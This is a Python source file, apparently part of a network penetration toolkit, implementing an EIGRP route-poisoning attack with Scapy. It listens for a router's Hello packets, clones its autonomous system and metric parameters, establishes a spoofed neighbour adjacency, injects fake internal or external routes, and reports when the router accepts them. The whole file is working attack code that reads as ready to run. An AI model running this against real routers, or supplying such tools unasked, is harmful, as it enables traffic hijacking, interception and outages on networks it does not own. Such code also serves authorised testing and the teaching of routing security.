from scapy.all import *
from scapy.contrib.eigrp import EIGRP, EIGRPParam, EIGRPIntRoute, EIGRPExtRoute, EIGRPSwVer
from colorama import *
from threading import Thread


def eigrp_poisoning(network, prefix, next_hop, interface, internal_flag, external_flag):
    global networks, prefixes, next_hops
    networks = [net.strip() for net in network.split("_")]
    prefixes = [pref.strip() for pref in prefix.split("_")]
    next_hops = [nh.strip() for nh in next_hop.split("_")]

    if internal_flag and external_flag:
        print(
            Fore.RED + f"    [-] %ERROR: Arguments -e (--external) and -i (--internal) cannot be used together")  # Переведено
        return

    if len(networks) != len(prefixes) or len(networks) != len(next_hops):
        print(
            Fore.RED + f"    [-] %ERROR: Mismatch in 'network', 'next_hop', 'prefix' lengths (must be equal!)")  # Переведено
        return
    else:
        print(Fore.YELLOW + f"    [!] Listening for EIGRP routers... Please wait...")  # Переведено
        global eigrp_hello_captured, eigrp_reply_captured, neighborhood_established
        eigrp_hello_captured = False  # Не захвачен
        eigrp_reply_captured = False  # Не захвачен
        neighborhood_established = False

        def analyze_packet(packet):
            global target_mac, target_ip, autonomous_system, k1, k2, k3, k4, k5, hold_time, ios
            global network
            if packet.haslayer(EIGRP) and packet[EIGRP].opcode == 5:  # Если это EIGRP Hello
                global eigrp_hello_captured
                eigrp_hello_captured = True  # Захвачен

                target_mac = (packet[Ether].src).upper()
                target_ip = packet[IP].src
                autonomous_system = packet[EIGRP].asn
                k1 = packet[EIGRPParam].k1
                k2 = packet[EIGRPParam].k2
                k3 = packet[EIGRPParam].k3
                k4 = packet[EIGRPParam].k4
                k5 = packet[EIGRPParam].k5
                hold_time = packet[EIGRPParam].holdtime
                # ios = packet[EIGRPSwVer].ios
                conf.checkIPaddr = False

                print(Fore.GREEN + f"\n    [+] [EIGRP router detected]")  # Переведено
                print(Fore.GREEN + f"         IP: {target_ip}")  # Переведено
                print(Fore.GREEN + f"         MAC: {target_mac}")  # Переведено
                print(Fore.GREEN + f"         Autonomous System: {autonomous_system}")  # Переведено
                print(Fore.GREEN + f"         K1: {k1}, K2: {k2}, K3: {k3}, K4: {k4}, K5: {k5}")  # Переведено
                print(Fore.GREEN + f"         Hold Time: {hold_time}")  # Переведено

        def send_eigrp_hello():  # Отправка EIGRP Hello соседнему роутеру каждые 5 сек
            global target_mac, target_ip, autonomous_system, k1, k2, k3, k4, k5, hold_time  # , ios
            try:
                while True:
                    hello_packet = (Ether(src="00:25:2e:01:ab:3c", dst="01:00:5e:00:00:0a") /
                                    IP(dst="224.0.0.10", ttl=1) /
                                    EIGRP(opcode=5, asn=autonomous_system) /
                                    EIGRPParam(holdtime=hold_time, k1=k1, k2=k2, k3=k3, k4=k4, k5=k5) /
                                    EIGRPSwVer())
                    sendp(hello_packet, iface=interface, verbose=False)
                    time.sleep(5)
            except KeyboardInterrupt:
                print(Fore.YELLOW + f"\n\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено

        def send_eigrp_ack():  # Отправка EIGRP Ack на обновления соседа
            def analyze_update(packet):
                if packet.haslayer(EIGRP) and packet[EIGRP].opcode == 1 and packet[Ether].src != "00:25:2e:01:ab:3c" or \
                        packet[EIGRP].opcode == 4:
                    global neighborhood_established
                    seq_of_neighbor = packet[EIGRP].seq
                    target_mac = packet[Ether].src
                    target_ip = packet[IP].src
                    ack_for_update = (Ether(src="00:25:2e:01:ab:3c", dst=target_mac) /
                                      IP(dst=target_ip, ttl=1) /
                                      EIGRP(opcode=5, asn=autonomous_system, ack=seq_of_neighbor))
                    sendp(ack_for_update, iface=interface, count=1, verbose=False)
                    if neighborhood_established == False:
                        print(Fore.GREEN + f"\n    [+] Adjacency established")  # Переведено
                    neighborhood_established = True

            sniff(filter="ip proto 88", iface=interface, prn=analyze_update, store=0)

        def send_eigrp_update():  # Единичная отправка ложных маршрутов
            time.sleep(2)
            print(Fore.YELLOW + f"    [!] Injecting fake EIGRP routes...")  # Переведено
            seq = random.randint(1, 99)
            conf.checkIPaddr = False

            internal_routes = []  # Формируем TLV для внутренних маршрутов
            for net, pref, nh in zip(networks, prefixes, next_hops):
                route = EIGRPIntRoute(nexthop=nh, dst=net, prefixlen=int(pref))
                internal_routes.append(route)
            internal_tlv_chain = internal_routes[0]
            for route in internal_routes[1:]:
                internal_tlv_chain = internal_tlv_chain / route

            external_routes = []  # Формируем TLV для внешних маршрутов
            for net, pref, nh in zip(networks, prefixes, next_hops):
                route = EIGRPExtRoute(nexthop=nh, dst=net, prefixlen=int(pref))
                external_routes.append(route)
            external_tlv_chain = external_routes[0]
            for route in external_routes[1:]:
                external_tlv_chain = external_tlv_chain / route

            if internal_flag:  # Если выбран флаг --internal
                init_packet = (Ether(src="00:25:2e:01:ab:3c", dst=target_mac) /
                               IP(dst=target_ip, ttl=1) /
                               EIGRP(opcode=1, asn=autonomous_system, seq=seq, flags=1))
                sendp(init_packet, iface=interface, count=1, verbose=False)
                update_packet = (Ether(src="00:25:2e:01:ab:3c", dst=target_mac) /
                                 IP(dst=target_ip, ttl=1) /
                                 EIGRP(opcode=1, asn=autonomous_system, seq=seq + 1, flags=8,
                                       tlvlist=[internal_tlv_chain]))
                sendp(update_packet, iface=interface, count=1, verbose=False)  # Отправляем EIGRP Update
                time.sleep(2)
                query_packet = (Ether(src="00:25:2e:01:ab:3c", dst="01:00:5e:00:00:0a") /
                                IP(dst="224.0.0.10", ttl=1) /
                                EIGRP(opcode=3, asn=autonomous_system, seq=seq + 2, tlvlist=[internal_tlv_chain]))
                sendp(query_packet, iface=interface, count=1,
                      verbose=False)  # Формируем и отправляем EIGRP Query, чтобы понять были ли маршруты получены

            if external_flag:  # Если выбран флаг --external
                init_packet = (Ether(src="00:25:2e:01:ab:3c", dst=target_mac) /
                               IP(dst=target_ip, ttl=1) /
                               EIGRP(opcode=1, asn=autonomous_system, seq=seq, flags=1))
                sendp(init_packet, iface=interface, count=1, verbose=False)
                update_packet = (Ether(src="00:25:2e:01:ab:3c", dst=target_mac) /
                                 IP(dst=target_ip, ttl=1) /
                                 EIGRP(opcode=1, asn=autonomous_system, seq=seq + 1, flags=8,
                                       tlvlist=[external_tlv_chain]))
                sendp(update_packet, iface=interface, count=1, verbose=False)  # Отправляем EIGRP Update
                time.sleep(2)
                query_packet = (Ether(src="00:25:2e:01:ab:3c", dst="01:00:5e:00:00:0a") /
                                IP(dst="224.0.0.10", ttl=1) /
                                EIGRP(opcode=3, asn=autonomous_system, seq=seq + 2, tlvlist=[external_tlv_chain]))
                sendp(query_packet, iface=interface, count=1,
                      verbose=False)  # Формируем и отправляем EIGRP Query, чтобы понять были ли маршруты получены

            if not internal_flag and not external_flag:  # Если не выбран ни --internal ни --external
                init_packet = (Ether(src="00:25:2e:01:ab:3c", dst=target_mac) /
                               IP(dst=target_ip, ttl=1) /
                               EIGRP(opcode=1, asn=autonomous_system, seq=seq, flags=1))
                sendp(init_packet, iface=interface, count=1, verbose=False)
                update_packet = (Ether(src="00:25:2e:01:ab:3c", dst=target_mac) /
                                 IP(dst=target_ip, ttl=1) /
                                 EIGRP(opcode=1, asn=autonomous_system, seq=seq + 1, flags=8,
                                       tlvlist=[internal_tlv_chain]))
                sendp(update_packet, iface=interface, count=1, verbose=False)  # Отправляем EIGRP Update
                time.sleep(2)
                query_packet = (Ether(src="00:25:2e:01:ab:3c", dst="01:00:5e:00:00:0a") /
                                IP(dst="224.0.0.10", ttl=1) /
                                EIGRP(opcode=3, asn=autonomous_system, seq=seq + 2, tlvlist=[internal_tlv_chain]))
                sendp(query_packet, iface=interface, count=1,
                      verbose=False)  # Формируем и отправляем EIGRP Query, чтобы понять были ли маршруты получены

        def receive_eigrp_reply():
            def is_eigrp_reply(packet):
                global eigrp_reply_captured
                if packet.haslayer(EIGRP) and packet[EIGRP].opcode == 4:  # Если это EIGRP Reply (op=4)
                    if hasattr(packet[EIGRP], 'tlvlist'):
                        for tlv in packet[EIGRP].tlvlist:
                            if hasattr(tlv, 'dst'):  # Если в tlvlist есть dst (сеть назначения)
                                if tlv.dst in networks:  # Если в tlvlist есть сеть/сети из networks
                                    router = packet[IP].src
                                    print(
                                        Fore.GREEN + f"    [+] INJECTION SUCCESSFUL: Router {router} accepted spoofed routes")  # Переведено
                                    print(
                                        Fore.YELLOW + f"\n    [!] WARNING: Interrupting the attack will flush injected routes! (Press Ctrl + C to Stop)")  # Переведено
                                    eigrp_reply_captured = True
                                    return True
                return False

            sniff(filter="ip proto 88", iface=interface, prn=lambda x: None, stop_filter=is_eigrp_reply, store=False,
                  timeout=10)  # Захватываем EIGRP Reply в ответ на EIGRP Query

        sniff(filter="ip proto 88", iface=interface, prn=analyze_packet, store=0, timeout=20,
              count=1)  # Ждем захвата EIGRP пакета и анализируем его

        if eigrp_hello_captured == False:  # Если не найден ни один EIGRP роутер
            print(Fore.RED + f"    [-] %ERROR: No EIGRP routers detected (attack aborted)")  # Переведено
            return

        else:  # Если найден - запускаем Hello, Update и Ack процессы
            Thread(target=receive_eigrp_reply, daemon=False).start()
            Thread(target=send_eigrp_hello, daemon=False).start()
            Thread(target=send_eigrp_ack, daemon=False).start()
            Thread(target=send_eigrp_update, daemon=False).start()

        time.sleep(10)
        if eigrp_reply_captured == False:  # Если не было захвачено ни одного EIGRP Reply (т.е. маршруты не приняты)
            print(
                Fore.RED + f"    [-] %ERROR: Fake routes were not accepted by the neighboring router (attack aborted)")  # Переведено